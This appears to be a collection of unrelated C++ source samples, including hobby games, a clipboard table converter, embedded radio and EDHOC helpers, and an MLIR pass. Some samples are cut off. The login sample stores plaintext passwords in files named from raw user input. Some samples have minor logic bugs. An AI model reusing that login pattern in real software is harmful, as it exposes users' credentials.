    "\r\n// ClipTabToHtml.cpp : Defines the class behaviors for the application.\r\n//\r\n\r\n#include \"framework.h\"\r\n#include \"ClipTabToHtml.h\"\r\n//#include \"ClipTabToHtmlDlg.h\"\r\n\r\n#ifdef _DEBUG\r\n#define new DEBUG_NEW\r\n#endif\r\n\r\nint BuildHtmlTable(const TCHAR* source, TCHAR* target);\r\nvoid CopyHTML(char* html);\r\n\r\n// CClipTabToHtmlApp\r\n\r\nBEGIN_MESSAGE_MAP(CClipTabToHtmlApp, CWinApp)\r\n\tON_COMMAND(ID_HELP, &CWinApp::OnHelp)\r\nEND_MESSAGE_MAP()\r\n\r\n\r\n// CClipTabToHtmlApp construction\r\n\r\nCClipTabToHtmlApp::CClipTabToHtmlApp()\r\n{\r\n\t// TODO: add construction code here,\r\n\t// Place all significant initialization in InitInstance\r\n}\r\n\r\n\r\n// The one and only CClipTabToHtmlApp object\r\n\r\nCClipTabToHtmlApp theApp;\r\n\r\n\r\n// CClipTabToHtmlApp initialization\r\n\r\nBOOL CClipTabToHtmlApp::InitInstance()\r\n{\r\n\t/*\r\n\t// InitCommonControlsEx() is required on Windows XP if an application\r\n\t// manifest specifies use of ComCtl32.dll version 6 or later to enable\r\n\t// visual styles.  Otherwise, any window creation will fail.\r\n\tINITCOMMONCONTROLSEX InitCtrls;\r\n\tInitCtrls.dwSize = sizeof(InitCtrls);\r\n\t// Set this to include all the common control classes you want to use\r\n\t// in your application.\r\n\tInitCtrls.dwICC = ICC_WIN95_CLASSES;\r\n\tInitCommonControlsEx(&InitCtrls);\r\n\t*/\r\n\r\n\tCWinApp::InitInstance();\r\n\r\n\tConvertClipBoard();\r\n\r\n\t/*\r\n\t// Create the shell manager, in case the dialog contains\r\n\t// any shell tree view or shell list view controls.\r\n\tCShellManager *pShellManager = new CShellManager;\r\n\r\n\t// Activate \"Windows Native\" visual manager for enabling themes in MFC controls\r\n\tCMFCVisualManager::SetDefaultManager(RUNTIME_CLASS(CMFCVisualManagerWindows));\r\n\r\n\t// Standard initialization\r\n\t// If you are not using these features and wish to reduce the size\r\n\t// of your final executable, you should remove from the following\r\n\t// the specific initialization routines you do not need\r\n\t// Change the registry key under which our settings are stored\r\n\t// TODO: You should modify this string to be something appropriate\r\n\t// such as the name of your company or organization\r\n\tSetRegistryKey(_T(\"ClipTabToHtml\"));\r\n\r\n\tCClipTabToHtmlDlg dlg;\r\n\tm_pMainWnd = &dlg;\r\n\tINT_PTR nResponse = dlg.DoModal();\r\n\tif (nResponse == IDOK)\r\n\t{\r\n\t\t// TODO: Place code here to handle when the dialog is\r\n\t\t//  dismissed with OK\r\n\t\tConvertClipBoard();\r\n\t}\r\n\telse if (nResponse == IDCANCEL)\r\n\t{\r\n\t\t// TODO: Place code here to handle when the dialog is\r\n\t\t//  dismissed with Cancel\r\n\t}\r\n\telse if (nResponse == -1)\r\n\t{\r\n\t\tTRACE(traceAppMsg, 0, \"Warning: dialog creation failed, so application is terminating unexpectedly.\\n\");\r\n\t\tTRACE(traceAppMsg, 0, \"Warning: if you are using MFC controls on the dialog, you cannot #define _AFX_NO_MFC_CONTROLS_IN_DIALOGS.\\n\");\r\n\t}\r\n\r\n\t// Delete the shell manager created above.\r\n\tif (pShellManager != nullptr)\r\n\t{\r\n\t\tdelete pShellManager;\r\n\t}\r\n\r\n#if !defined(_AFXDLL) && !defined(_AFX_NO_MFC_CONTROLS_IN_DIALOGS)\r\n\tControlBarCleanUp();\r\n#endif\r\n\t*/\r\n\r\n\t// Since the dialog has been closed, return FALSE so that we exit the\r\n\t//  application, rather than start the application's message pump.\r\n\treturn FALSE;\r\n}\r\n\r\nvoid CClipTabToHtmlApp::ConvertClipBoard()\r\n{\r\n\t//open the clipboard\r\n#ifdef _UNICODE\r\n\tif (::IsClipboardFormatAvailable(CF_UNICODETEXT) && ::OpenClipboard(NULL))\r\n\t{\r\n\t\tHANDLE hData = ::GetClipboardData(CF_UNICODETEXT);\r\n\t\tWCHAR* buffer = (WCHAR*)::GlobalLock(hData);\r\n\t\tint tablesize = BuildHtmlTable(buffer, nullptr); // find out how much memory is needed\r\n\t\tWCHAR* wtable = new WCHAR[tablesize]; // allocate that memory\r\n\t\tBuildHtmlTable(buffer, wtable); // wtable is widechar\r\n\t\tint len = (int) wcslen(wtable) + 1; // include trailing '\\0'\r\n\t\t// each WCHAR may expand to maximal 4 byte in UTF-8\r\n\t\tchar* utf8table = new char[len*4];\r\n\t\tint cnt = ::WideCharToMultiByte(CP_UTF8, 0, wtable, len, utf8table, len * 4, NULL, FALSE);\r\n\t\tASSERT(cnt > 0);\r\n\t\tdelete[] wtable;\r\n\t\tASSERT(cnt >= 0);\r\n\t\t::GlobalUnlock(hData);\r\n\t\t::CloseClipboard();\r\n\t\tif (cnt > 0 && cnt <= len * 4)\r\n\t\t\tCopyHTML(utf8table); // create as clipboard \"HTML Format\"\r\n\t\tdelete[] utf8table;\r\n\t}\r\n//\telse\r\n#endif\r\n/*\r\n\t\tif (IsClipboardFormatAvailable(CF_TEXT) && ::OpenClipboard(NULL))\r\n\t\t{\r\n\t\t\tHANDLE hData = GetClipboardData(CF_TEXT);\r\n\t\t\tchar* buffer = (char*)GlobalLock(hData);\r\n\t\t\tsClipboard = buffer;\r\n\t\t\tGlobalUnlock(hData);\r\n\t\t\tCloseClipboard();\r\n\t\t}\r\n*/\r\n}\r\n\r\nint BuildHtmlTable(const TCHAR* source, TCHAR* target)\r\n{\r\n\tint tsize = 0;\r\n\t// html table\r\n\t// having style tag inside of body is not W3C-conform, but works.\r\n\tstatic const TCHAR table_open[] = TEXT(\"<style> th { border: thin solid; } td { border: thin solid; } </style><table style=\\\"border: thin solid; border-collapse: collapse;\\\">\");\r\n\tstatic const TCHAR table_close[] = TEXT(\"</table>\");\r\n\tBOOL bTable = FALSE;\r\n\t// table header\r\n\tstatic const TCHAR thead_open[] = TEXT(\"<thead>\");\r\n\tstatic const TCHAR thead_close[] = TEXT(\"</thead>\");\r\n\tBOOL bTableHead = FALSE;\r\n\t// table body\r\n\tstatic const TCHAR tbody_open[] = TEXT(\"<tbody>\");\r\n\tstatic const TCHA",
    "// @author: shay.gali@msmail.ariel.ac.il\n#include \"LandVertex.hpp\"\n\n#include <iostream>\n\nLandVertex::LandVertex()\n    : id(-1), owner(nullptr), isCity(false) {}\n    \nLandVertex::LandVertex(int id)\n    : id(id), owner(nullptr), isCity(false), adjacentVertices(3, nullptr), adjacentEdges(3, nullptr), resources(3) {\n}\n\nvoid LandVertex::set_adjacent_vertex(LandVertex* vertex1, LandVertex* vertex2, LandVertex* vertex3) {\n    this->adjacentVertices[0] = vertex1;\n    this->adjacentVertices[1] = vertex2;\n    this->adjacentVertices[2] = vertex3;\n}\n\nvoid LandVertex::set_adjacent_edge(RoadEdge* edge1, RoadEdge* edge2, RoadEdge* edge3) {\n    this->adjacentEdges[0] = edge1;\n    this->adjacentEdges[1] = edge2;\n    this->adjacentEdges[2] = edge3;\n}\n\nvoid LandVertex::set_resource(resource res1, int num1, resource res2, int num2, resource res3, int num3) {\n    this->resources[0] = std::make_pair(res1, num1);\n    this->resources[1] = std::make_pair(res2, num2);\n    this->resources[2] = std::make_pair(res3, num3);\n}\n\nLandVertex* LandVertex::get_adjacent_vertex(int index) {\n    return this->adjacentVertices[index];\n}\n\nRoadEdge* LandVertex::get_adjacent_edge(int index) {\n    return this->adjacentEdges[index];\n}\n\nvector<pair<resource, int>> LandVertex::get_resources() {\n    return this->resources;\n}\n\nint LandVertex::get_id() const {\n    return this->id;\n}\n\nPlayer* LandVertex::get_owner() {\n    return this->owner;\n}\n\nvoid LandVertex::set_owner(Player* player) {\n    this->owner = player;\n}\n\nbool LandVertex::is_contains_city() const {\n    return this->isCity;\n}\n\nvoid LandVertex::upgrade_to_city() {\n    this->isCity = true;\n}\n\nstd::string LandVertex::get_settlement_string() {\n    if (this->owner == nullptr) {\n        // empty vertex emoji\n        return \"E\";\n    }\n    std::string player_color_code = this->owner->get_color_code();\n    std::string RESET_COLOR = \"\\033[0m\";\n\n    string res = player_color_code;\n\n    if (this->isCity) {\n        res += \"\ud83c\udfd9\" + RESET_COLOR;\n    } else {\n        res += \"\ud83c\udfd8\" + RESET_COLOR;\n    }\n\n    return res;\n}",
    "\ufeff#include <iostream> \n#include <iomanip> \n#include <ctime> \n#include <windows.h>  \n\nusing namespace std;\n\nvoid printPole(int PolePrint[10][10], bool showShips) {//\u0424\u0443\u043d\u043a\u0446\u0438\u044f \u043d\u0430 \u0440\u043e\u0441\u0442\u0430\u043d\u043e\u0432\u043a\u0443 \u043a\u043e\u0440\u0430\u0431\u043b\u0435\u0439\n    for (int i = 0; i < 10; i++) {\n        for (int j = 0; j < 10; j++) {\n            if (PolePrint[i][j] == 9) {\n                cout << (char)219 << \" \"; // \u041f\u043e\u043f\u0430\u0434\u0430\u043d\u0438\u0435 \n            }\n            else if (PolePrint[i][j] == 8) {\n                cout << (char)193 << \" \";// \u041f\u0440\u043e\u043c\u0430\u0445 \n            }\n            else if (showShips && PolePrint[i][j] == 1) {\n                cout << (char)220 << \" \";// \u041a\u043e\u0440\u0430\u0431\u043b\u044c \n            }\n            else {\n                cout << \". \"; // \u041f\u0443\u0441\u0442\u043e\u0435 \u043c\u0435\u0441\u0442\u043e \n            }\n        }\n        cout << endl;\n    }\n}\n\nbool shoot(int shot[10][10], int x, int y) {//\u0424\u0443\u043d\u043a\u0446\u0438\u044f \u0432\u044b\u0441\u0442\u0440\u0435\u043b\u0430\n    if (shot[x][y] == 1) {\n        shot[x][y] = 9;\n        return true;\n    }\n    else if (shot[x][y] == 0) {\n        shot[x][y] = 8; // \u041f\u0440\u043e\u043c\u0430\u0445 \n        return false;\n    }\n    return false;\n}\nvoid setupShips(int field[10][10]) {//\u0424\u0443\u043d\u0443\u0446\u0438\u044f \u043f\u043e \u0440\u0430\u0441\u0442\u043e\u043d\u043e\u0432\u043a\u0435 \u043a\u043e\u0440\u0430\u0431\u043b\u0435\u0439\n    int shipsToPlace = 5;\n    int x, y;\n    while (shipsToPlace > 0) {\n        x = rand() % 10;\n        y = rand() % 10;\n        if (field[x][y] == 0) {\n            field[x][y] = 1; // \u043a\u043e\u0440\u0430\u0431\u043b\u044c \n            shipsToPlace--;\n        }\n    }\n}\nint main()\n{\n    HANDLE hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);//\u0423\u0431\u0438\u0440\u0430\u0435\u0442 \u043a\u0443\u0440\u0441\u043e\u0440\n    srand(time(NULL));\n    system(\"color F2\");\n    SetConsoleTitle(L\"\u041c\u043e\u0440\u0441\u043a\u043e\u0439 \u0431\u043e\u0439.\");\n    /*setlocale(LC_ALL, \"Russian\");*/\n    cout << \"Welcome Fuhrer. You are playing a sea battle!!!\" << endl;\n    cout << \"Here you can play with a friend.\" << endl;\n    cout << \"Rules of the game\" << endl;\n    cout << \"Field size - 10 * 10\\n\";\n    cout << \"The players draw lots to choose who shoots first,\\n\"\n        << \"Next, the ships are arranged randomly and each player takes turns,\\n\"\n        << \"If the player destroys the ship, he goes again.\\n\"\n        << \"\u041f\u043e\u0431\u0435\u0436\u0434\u0430\u0435\u0442 \u0442\u043e\u0442 \u043a\u0442\u043e \u0443\u0431\u0438\u043b 5 \u043a\u043e\u0440\u0430\u0431\u043b\u0435\u0439 \u043f\u0440\u043e\u0442\u0438\u0432\u043d\u0438\u043a\u0430.\\n\"\n        << \"\u0416\u0435\u043b\u0430\u044e \u0443\u0434\u0430\u0447\u0438!\\n\";\n    cout << endl;\n    int playerField[10][10] = {};\n    int enemyField[10][10] = {};\n    int enemySecretField[10][10] = {};\n    setupShips(playerField); // \u043a\u043e\u0440\u0430\u0431\u043b\u0438 \u0438\u0433\u0440\u043e\u043a\u0430 \n    setupShips(enemyField);  // \u043a\u043e\u0440\u0430\u0431\u043b\u0438 \u043f\u0440\u043e\u0442\u0438\u0432\u043d\u0438\u043a\u0430 \n    bool gameOver = false;\n    int playerHits = 0;//\u041a\u043e\u043b\u0438\u0447\u0435\u0432\u0441\u0442\u0432\u043e \u043f\u043e\u043f\u043e\u0434\u0430\u043d\u0438\u0439 \u0438\u0433\u0440\u043e\u043a\u0430\n    int enemyHits = 0;//\u041a\u043e\u043b\u0438\u0447\u0435\u0432\u0441\u0442\u0432\u043e \u043f\u043e\u043f\u043e\u0434\u0430\u043d\u0438\u0439 \u043f\u0440\u043e\u0442\u0438\u0432\u043d\u0438\u043a\u0430\n    const int shipsToWin = 5;//\u041a\u043e\u043b\u0438\u0447\u0435\u0432\u0441\u0442\u0432\u043e \u043a\u043e\u0440\u0430\u0431\u043b\u0435\u0439 \u0434\u043b\u044f \u0432\u044b\u0439\u0433\u0440\u044b\u0448\u0430\n    while (!gameOver) {\n        int x, y;\n        cout << \"Your field \\n\";\n        printPole(playerField, true);//\u041f\u043e\u043b\u0435 \u0438\u0433\u0440\u043e\u043a\u0430\n        cout << \"Enemy Field \\n\";\n        printPole(enemySecretField, false);//\u041f\u043e\u043b\u0435 \u043f\u0440\u043e\u0442\u0438\u0432\u043d\u0438\u043a\u0430\n        do {\n            cout << \"Enter shot x coordinates: \";\n            cin >> x;\n            cout << \"Enter the shot y coordinates: \";\n            cin >> y;\n        } while ((x > 9 || x < 0) && (y > 9 || y < 0));\n        if (shoot(enemyField, x, y)) {//\u0412\u044b\u0447\u0442\u0440\u0435\u043b \u0438\u0433\u0440\u043e\u043a\u0430\n            cout << \"Hit!\" << endl;\n            enemySecretField[x][y] = 9;\n            playerHits++;\n            if (playerHits == shipsToWin) {//\u041f\u0440\u043e\u0432\u0435\u0440\u043a\u0430 \u043f\u043e\u0431\u0435\u0434\u044b\n                cout << \"You won!\" << endl;\n                gameOver = true;\n                break;\n            }\n        }\n        else {\n            cout << \"Miss!\" << endl;\n            enemySecretField[x][y] = 8;\n        }\n        do {\n            x = rand() % 10;\n            y = rand() % 10;\n        } while (playerField[x][y] == 8 || playerField[x][y] == 9);\n\n        if (shoot(playerField, x, y)) {//\u0412\u044b\u0441\u0442\u0440\u0435\u043b \u043f\u0440\u043e\u0442\u0438\u0432\u043d\u0438\u043a\u0430\n            cout << \"The enemy has hit your ship!\" << endl;\n            enemyHits++;\n            if (enemyHits == shipsToWin) {//\u041f\u0440\u043e\u0432\u0435\u0440\u043a\u0430 \u043f\u043e\u0431\u0435\u0434\u044b\n                cout << \"You lose!\" << endl;\n                gameOver = true;\n                break;\n            }\n        }\n        else {\n            cout << \"The enemy missed!\" << endl;\n        }\n    }\n}",
    "#include<iostream>\nusing namespace std;\n\nint main()\n{\n    double *number1, *number2;\n    char *sign;\n    double *total;\n\n    number1 = new double;\n    number2 = new double;\n    total = new double;\n    sign = new char;\n\n    cout << \"Enter Two Numbers and the operation sign: \";\n    cin >> *number1 >> *number2 >> *sign;\n\n    switch(*sign)\n    {\n        case '+':\n            *total = *number1 + *number2;\n            break;\n        case '-':\n            *total = *number1 - *number2;\n            break;\n        case '*':\n            *total = *number1 * *number2;\n            break;\n        case '/':\n            if (*number2 != 0)\n                *total = *number1 / *number2;\n            else\n                cout << \"Division by zero error!\" << endl;\n            break;\n        default:\n            cout << \"Invalid operation sign!\" << endl;\n    }\n            cout << *number1 << \" \" << *sign << \" \" << *number2 << \" = \" << *total;\n\n\n    delete number1;\n    delete number2;\n    delete total;\n    delete sign;\n\n    return 0;\n}\n",
    "#include <iostream>\r\n#include <fstream> // allows for the reading, writing, and creation of files\r\n#include <string>\r\nbool isLoggedIn() {\r\n    std::string username, password;\r\n    std::string un, pw; // will use to compare with the strings above\r\n\r\n    std::cout << \"Enter a username: \";\r\n    std::cin >> username;\r\n    std::cout << \"Enter a password: \";\r\n    std::cin >> password;\r\n\r\n    std::ifstream read(username + \".txt\"); // ifstream will read the file in the \"\" \r\n    getline(read, un); // will read the username\r\n    getline(read, pw); // will read the password\r\n\r\n    if(un == username && pw == password) { // checks if un is the same as username and pw the same as password. if so returns true.\r\n        return true;\r\n    }\r\n    else {\r\n        return false;\r\n    }\r\n}\r\n\r\n\r\nint main() {\r\n    int userChoice;\r\n\r\n    std::cout << std::endl;\r\n    std::cout << \"Main Menu: \" << std::endl;\r\n    std::cout << \"---------------\" << std::endl;\r\n    std::cout << \"1. Register\" << std::endl;\r\n    std::cout << \"2. Login\" << std::endl;\r\n    std::cout << std::endl;\r\n    std::cout << \"Your choice: \";\r\n    std::cin >> userChoice;\r\n\r\n    if (userChoice == 1) {\r\n        std::string username, password;\r\n\r\n        std::cout << \"Registration: \" << std::endl;\r\n        std::cout << std::endl;\r\n        std::cout << \"Select a username: \";\r\n        std::cin >> username;\r\n        std::cout << \"Select a password: \";\r\n        std::cin >> password;\r\n\r\n        std::ofstream file; // ofstream creates a file\r\n        file.open(username + \".txt\");\r\n        file << username << std::endl << password;\r\n        file.close();\r\n        std::cout << \"Welcome \" << username << \"!\" << std::endl;\r\n    }\r\n    else if (userChoice == 2) { // user chooses to login to an account\r\n        bool status = isLoggedIn();\r\n\r\n        if(!status) { // if isLoggedIn(); returns false this will activate\r\n            system(\"clear\");\r\n            std::cout << std::endl;\r\n            std::cout << \"Invalid login!\" << std::endl;\r\n            main();\r\n            return 0;\r\n        }\r\n        else { // if isLoggedIn() returns true, the dashboard is displayed\r\n            std::cout << \"Successfully logged in!\" << std::endl;\r\n            std::cout << std::endl;\r\n\r\n            int choiceTwo;\r\n            // Display the dashboard:\r\n            std::cout << \"Welcome back!\" << std::endl;\r\n            std::cout << std::endl;\r\n            std::cout << \"DASHBOARD\" << std::endl;\r\n            std::cout << \"This is placeholder text, could be anything.\" << std::endl; // example of what could appear on the the user's dashboard\r\n            std::cout << std::endl;\r\n            std::cout << \"1. Sign Out\" << std::endl;\r\n            std::cout << \"2. Back to main menu\" << std::endl;\r\n            std::cout << \"Your choice: \" << std::endl;\r\n            std::cin >> choiceTwo;\r\n\r\n            if (choiceTwo == 1) {\r\n                system(\"exit\"); // will exit the program\r\n            }\r\n            else if (choiceTwo == 2) {\r\n                main();\r\n            }\r\n            return 1;\r\n        }\r\n    }\r\n}",
    "#include <iostream>\n#include <iomanip>\n#include <conio.h>\n#include <string.h>\n#include <ctype.h>\nusing namespace std;\nclass Product\n{\nprivate:\n    int id;\n    char name[50];\n    char Name[50];\n\npublic:\n    Product()\n    {\n\n        id = 0;\n        strcpy(name, \"\");\n        strcpy(Name, \"\");\n    }\n    Product(int I, char N[50], char AN[50])\n    {\n\n        id = I;\n        strcpy(name, N);\n        strcpy(Name, AN);\n    }\n    void displayProduct()\n    {\n        cout << setw(8) << id;\n        cout << setw(23) << name;\n        cout << setw(33) << Name;\n        cout << endl;\n    }\n    int identification()\n    {\n        return id;\n    }\n};\nstruct issueresult\n{\n    char username[50];\n    int productid;\n};\n\nclass Inventory\n{\nprivate:\n    int maxProducts;\n    int productCount;\n    Product products[100];\n    int choose;\n    int dell;\n    int re_book;\n\npublic:\n    Inventory()\n    {\n        maxProducts = 100;\n        productCount = 0;\n    }\n    void addProduct(int id, char name[50], char Name[50])\n    {\n        if (productCount < maxProducts)\n        {\n            products[productCount++] = Product(id, name, Name);\n\n            cout << \"    Book added successfully.(\\'_\\')\" << endl;\n        }\n        else\n        {\n            cout << \"Error: Library is full.\" << endl;\n        }\n    }\n    void displayInventory();\n    void choice();\n    void deleteobj();\n    issueresult issue_book();\n    void show(issueresult p)\n    {\n\n        cout << setw(8) << p.productid;\n        cout << setw(33) << p.username;\n        cout << endl;\n    }\n};\nvoid Inventory ::displayInventory()\n{\n    if (productCount == 0)\n    {\n        cout << \"inventory is empty\";\n    }\n    else\n    {\n        for (int i = 0; i < productCount; i++)\n        {\n            products[i].displayProduct();\n        }\n    }\n}\nvoid Inventory ::choice()\n{\n    cout << \"Enter the book ID you want to search:\" << endl;\n    cin >> choose;\n    for (int i = 0; i < productCount; i++)\n    {\n\n        if (choose == products[i].identification())\n        {\n            cout << endl\n                 << setw(10) << \"Book ID |\";\n            cout << setw(20) << \"Book Name |\";\n            cout << setw(30) << \"Author Name |\" << endl;\n            products[i].displayProduct();\n        }\n    }\n    cout << \"Book not found.\";\n}\nvoid Inventory ::deleteobj()\n{\n    int dell;\n    cout << \"Enter the index number of the book you want to delete:\";\n    cin >> dell;\n\n    int found = 0;\n    for (int i = 0; i < productCount; i++)\n    {\n        if (i == dell)\n        {\n            found = 1;\n            for (; i < productCount - 1; i++)\n            {\n                products[i] = products[i + 1];\n            }\n            productCount--;\n            break;\n        }\n    }\n\n    if (found != 1)\n    {\n        cout << \"Book not found\";\n    }\n    else\n    {\n        for (int j = 0; j < productCount; j++)\n        {\n            products[j].displayProduct();\n        }\n    }\n}\nissueresult Inventory::issue_book()\n{\n    issueresult r1;\n    int found1 = 0;\n    cout << \"Enter the name of user you want to issue book to: \";\n    cin >> r1.username;\n    cout << \"Enter the book id you want to issue: \";\n    cin >> r1.productid;\n    for (int i = 0; i < productCount; i++)\n    {\n        if (r1.productid == products[i].identification())\n        {\n            cout << \"book issued successfully\";\n            found1 = 1;\n            break;\n        }\n    }\n    if (found1 == 0)\n    {\n        cout << \"book not found\";\n        r1.productid = 0;\n      //  strcpy(r1.username = \"0\");\n        r1.username[0] = '\\0';\n    }\n    return r1;\n}\nint main()\n\n{\n\n    Inventory a1;\n    // issueresult r1 = a1.issue_book();\n    issueresult r2[100];\n    int issuedbookcount = 0;\n    int choice;\n    int I_R;\n       cout << endl\n             << \" ======================================================================\" << endl;\n        cout << endl\n             << \"               ************Library Management*\" << endl;\n        cout << \" ======================================================================\" << endl;\n        cout << \"1.Book detail entry.\" << endl;\n        cout << \"2.Display all books.\" << endl;\n        cout << \"3.Search book detail.\" << endl;\n        cout << \"4.Delete book detail.\" << endl;\n        cout << \"5.Issue and return section.\" << endl;\n        cout << \"6.Exit Program.\" << endl;\n\n    do\n    {\n     \n\n        // int choice;\n        cout << endl\n             << \"Enter your choice (1-6).\" << endl;\n        cin >> choice;\n        switch (choice)\n        {\n        case 1:\n        {\n            int i;\n            char bookName[50];\n            char authorName[50];\n            char ch[10];\n            int q;\n            cout << \"                   [Book detail entery section]\" << endl;\n            do\n            {\n                cout << \"Enter book id in integers and the value will be between 0 to 999:\" << endl;\n                cin >> i;\n                while (cin.fail())\n                {\n                    cin.clear();\n                    cin >> ch;\n  ",
    "#include \"RCNow.h\"\r\n\r\nReceiveCallback RCNow::receiveCallback = nullptr;\r\nuint16_t RCNow::myID = 0xFFFF;\r\nconst uint8_t RCNow::broadcastAddress[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};\r\n\r\nstruct Message {\r\n    uint16_t conversationID;\r\n    uint16_t senderID;\r\n    double values[16];\r\n};\r\n\r\nRCNow::RCNow() {}\r\n\r\nbool RCNow::begin(uint16_t id) {\r\n    myID = id;\r\n\r\n    WiFi.mode(WIFI_STA);\r\n    if (esp_now_init() != ESP_OK) {\r\n        Serial.println(\"Error initializing ESP-NOW\");\r\n        return false;\r\n    }\r\n\r\n    esp_now_register_recv_cb(onDataRecv);\r\n\r\n    esp_now_peer_info_t peerInfo = {};\r\n    memcpy(peerInfo.peer_addr, broadcastAddress, 6);\r\n    peerInfo.channel = 0;  \r\n    peerInfo.encrypt = false;\r\n\r\n    if (esp_now_add_peer(&peerInfo) != ESP_OK) {\r\n        Serial.println(\"Failed to add broadcast peer\");\r\n        return false;\r\n    }\r\n\r\n    return true;\r\n}\r\n\r\nbool RCNow::send(double v1, double v2, double v3, double v4, double v5, double v6, double v7, double v8, double v9, double v10, double v11, double v12, double v13, double v14, double v15, double v16) {\r\n    Message msg = { myID, myID, {v1, v2, v3, v4, v5, v6, v7, v8, v9, v10, v11, v12, v13, v14, v15, v16} };\r\n    esp_err_t result = esp_now_send(broadcastAddress, (uint8_t *) &msg, sizeof(msg));\r\n\r\n    if (result != ESP_OK) {\r\n        Serial.print(\"Failed to send values. Error code: \");\r\n        Serial.println(result);\r\n\r\n        switch (result) {\r\n            case ESP_ERR_ESPNOW_NOT_INIT:\r\n                Serial.println(\"ESP-NOW is not initialized.\");\r\n                break;\r\n            case ESP_ERR_ESPNOW_ARG:\r\n                Serial.println(\"Invalid argument.\");\r\n                break;\r\n            case ESP_ERR_ESPNOW_INTERNAL:\r\n                Serial.println(\"Internal error.\");\r\n                break;\r\n            case ESP_ERR_ESPNOW_NO_MEM:\r\n                Serial.println(\"ESP-NOW out of memory.\");\r\n                break;\r\n            case ESP_ERR_ESPNOW_NOT_FOUND:\r\n                Serial.println(\"Peer not found.\");\r\n                break;\r\n            case ESP_ERR_ESPNOW_IF:\r\n                Serial.println(\"Interface error.\");\r\n                break;\r\n            default:\r\n                Serial.println(\"Unknown error.\");\r\n                break;\r\n        }\r\n    }\r\n\r\n    return result == ESP_OK;\r\n}\r\n\r\nvoid RCNow::onReceive(ReceiveCallback callback) {\r\n    receiveCallback = callback;\r\n}\r\n\r\nvoid RCNow::onDataRecv(const uint8_t *mac, const uint8_t *incomingData, int len) {\r\n    Message msg;\r\n    memcpy(&msg, incomingData, sizeof(msg));\r\n\r\n    if (receiveCallback && msg.conversationID == myID) {\r\n        receiveCallback(msg.senderID, msg.values[0], msg.values[1], msg.values[2], msg.values[3], msg.values[4], msg.values[5], msg.values[6], msg.values[7], msg.values[8], msg.values[9], msg.values[10], msg.values[11], msg.values[12], msg.values[13], msg.values[14], msg.values[15]);\r\n    }\r\n}\r\n",
    "#include <iostream>\n#include <future>\n#include <exception>\n#include <stdexcept>\n\n#include \"EdhocEADManager.h\"\n#include \"UserContext.h\"\n#include \"Utils.h\"\n\nEdhocEADManager::EdhocEADManager() {\n    this->ead.compose = ComposeEAD;\n    this->ead.process = ProcessEAD;\n}\n\nEdhocEADManager::~EdhocEADManager() {\n\n}\n\nvoid EdhocEADManager::StoreEADBuffer(enum edhoc_message message, int label, std::vector<uint8_t> ead) {\n    auto& vecOfMaps = EadBuffers_[message];\n    std::map<int, std::vector<uint8_t>> newMap;\n    newMap[label] = ead;\n    vecOfMaps.push_back(std::move(newMap));\n}\n\nconst std::vector<std::map<int, std::vector<uint8_t>>>& EdhocEADManager::GetEADBuffersByMessage(enum edhoc_message message) {\n    return EadBuffers_[message];\n}\n\nvoid EdhocEADManager::ClearEADBuffersByMessage(enum edhoc_message message) {\n    EadBuffers_.erase(message);\n}\n\nint EdhocEADManager::ComposeEAD(void *user_context, enum edhoc_message message, struct edhoc_ead_token *ead_token, size_t ead_token_size, size_t *ead_token_len) {\n    UserContext* context = static_cast<UserContext*>(user_context);\n    EdhocEADManager* manager = context->GetEADManager();\n    return manager->CallComposeEAD(message, ead_token, ead_token_size, ead_token_len);\n}\n\nint EdhocEADManager::ProcessEAD(void *user_context, enum edhoc_message message, const struct edhoc_ead_token *ead_token, size_t ead_token_size) {\n    UserContext* context = static_cast<UserContext*>(user_context);\n    EdhocEADManager* manager = context->GetEADManager();\n    return manager->CallProcessEAD(message, ead_token, ead_token_size);\n}\n\nint EdhocEADManager::CallComposeEAD(enum edhoc_message message, struct edhoc_ead_token *ead_token, size_t ead_token_size, size_t *ead_token_len) {\n    const std::vector<std::map<int, std::vector<uint8_t>>>& eadBuffers = GetEADBuffersByMessage(message);\n\n    size_t count = 0;\n\n    for (auto const& map : eadBuffers) {\n        for (auto const& [label, buffer] : map) {\n            if (count >= ead_token_size) {\n                break;\n            }\n            ead_token[count].label = label;\n            ead_token[count].value = buffer.data();\n            ead_token[count].value_len = buffer.size();\n            count++;\n        }\n    }\n\n    *ead_token_len = count;\n\n    return EDHOC_SUCCESS;\n}\n\nint EdhocEADManager::CallProcessEAD(enum edhoc_message message, const struct edhoc_ead_token *ead_token, size_t ead_token_size) {\n    for (size_t i = 0; i < ead_token_size; ++i) {\n        const edhoc_ead_token& token = ead_token[i];\n        std::vector<uint8_t> eadBuffer(token.value, token.value + token.value_len);\n        \n        this->StoreEADBuffer(message, token.label, eadBuffer);\n    }\n\n    return EDHOC_SUCCESS;\n}",
    "//===- StandalonePasses.cpp - Standalone passes -----------------*- C++ -*-===//\n//\n// This file is licensed under the Apache License v2.0 with LLVM Exceptions.\n// See https://llvm.org/LICENSE.txt for license information.\n// SPDX-License-Identifier: Apache-2.0 WITH LLVM-exception\n//\n//===----------------------------------------------------------------------===//\n#include \"mlir/Dialect/Func/IR/FuncOps.h\"\n#include \"mlir/IR/PatternMatch.h\"\n#include \"mlir/Rewrite/FrozenRewritePatternSet.h\"\n#include \"mlir/Support/LogicalResult.h\"\n#include \"mlir/Transforms/GreedyPatternRewriteDriver.h\"\n\n#include \"Standalone/StandalonePasses.h\"\n\nnamespace mlir::standalone {\n#define GEN_PASS_DEF_STANDALONESWITCHBARFOO\n#include \"Standalone/StandalonePasses.h.inc\"\n\nnamespace {\nclass StandaloneSwitchBarFooRewriter : public OpRewritePattern<func::FuncOp> {\npublic:\n  using OpRewritePattern<func::FuncOp>::OpRewritePattern;\n  LogicalResult matchAndRewrite(func::FuncOp op,\n                                PatternRewriter &rewriter) const final {\n    if (op.getSymName() == \"bar\") {\n      rewriter.modifyOpInPlace(op, [&op]() { op.setSymName(\"foo\"); });\n      return success();\n    }\n    return failure();\n  }\n};\n\nclass StandaloneSwitchBarFoo\n    : public impl::StandaloneSwitchBarFooBase<StandaloneSwitchBarFoo> {\npublic:\n  using impl::StandaloneSwitchBarFooBase<\n      StandaloneSwitchBarFoo>::StandaloneSwitchBarFooBase;\n  void runOnOperation() final {\n    RewritePatternSet patterns(&getContext());\n    patterns.add<StandaloneSwitchBarFooRewriter>(&getContext());\n    FrozenRewritePatternSet patternSet(std::move(patterns));\n    if (failed(applyPatternsAndFoldGreedily(getOperation(), patternSet)))\n      signalPassFailure();\n  }\n};\n\n\n\n\n} // namespace\n} // namespace mlir::standalone\n",
